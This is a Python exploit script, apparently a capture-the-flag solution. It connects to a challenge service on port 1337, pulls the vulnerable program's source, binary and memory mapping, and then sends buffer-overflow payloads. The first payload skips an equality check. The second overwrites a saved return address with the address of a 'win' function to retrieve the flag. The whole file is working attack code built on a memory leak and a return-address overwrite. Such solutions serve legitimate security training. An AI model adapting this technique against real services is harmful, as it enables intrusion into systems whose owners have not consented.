#!/usr/bin/python3

import sys
import socket
import time
import struct
import telnetlib
import binascii

# settings
host = "localhost"
port = 1337

p64 = lambda x: struct.pack("<Q", x)

def dbg_print(txt):
    debug = False
    if debug:
        print(txt.decode('utf-8'))

# globals
s = None

def recv_until(delim):
    global s
    if type(delim) is not bytes:
        delim = delim.encode('utf-8')
    tmp = b''
    while delim not in tmp:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def connect():
    global s
    s = socket.socket()
    if len(sys.argv) > 1:
        s.connect((sys.argv[1], int(sys.argv[2])))
    else:
        s.connect((host, port))


def send(b):
    if type(b) is not bytes:
        b = b.encode('utf-8')
    s.send(b)


def get_sourcecode():
    send("Gimme your source please!\n")
    end_prompt = "Ready for next query:\n"
    source = recv_until(end_prompt)[:-len(end_prompt)]

    # Delete first and last line
    source = source[source.find(b'\n')+1:]
    source = source[:source.rfind(b'\n', 0, -1)]

    with open('vuln.source.c', 'wb') as f:
        f.write(source)
    #print(source.decode('utf-8'))

def get_binary():
    send("Gimme your binary please!\n")
    end_prompt = "Ready for next query:\n"
    binary = recv_until(end_prompt)[:-len(end_prompt)]

    # Delete first and last line
    binary = binary[binary.find(b'\n')+1:]
    binary = binary[:binary.rfind(b'\n', 0, -1)]

    binary = binascii.unhexlify(binary.strip())
    

    with open('vuln.binary', 'wb') as f:
        f.write(binary)

def get_programbase():
    send("Gimme me your memory mapping please!\n")
    end_prompt = "Ready for next query:\n"
    mapping = recv_until(end_prompt)[:-len(end_prompt)].decode('utf-8').strip()
    vuln_start = int(mapping[:mapping.find('-')], 16)
    return vuln_start
    

## Offsets for exploitation
win_offset = 0x1333
check_skip_byte = b'\x2d'

connect()

## First stage, retrieve source and binary
recv_until("Hello, how can I help you? Please submit your query!\n")
get_sourcecode()
get_binary()

program_base = get_programbase()
win_addr = program_base + win_offset


## Second stage: Abuse get_flag vulns
send("Gimme the flag!\n")
print(recv_until("tree?").decode('utf-8'))
# Abuse overflow in get_int() to skip the equal check and go into success region
send(p64(0)*7 + check_skip_byte)


# Now abuse the overflow in the success region by overwriting the return address with the address of the win function.
recv_until("name?\n")
send(b"pwn\x00" * 2 + p64(0) * 14 + p64(win_addr))

print(s.recv(0x10000).decode('utf-8'))
print(s.recv(0x10000).decode('utf-8'))
print(s.recv(0x10000).decode('utf-8'))
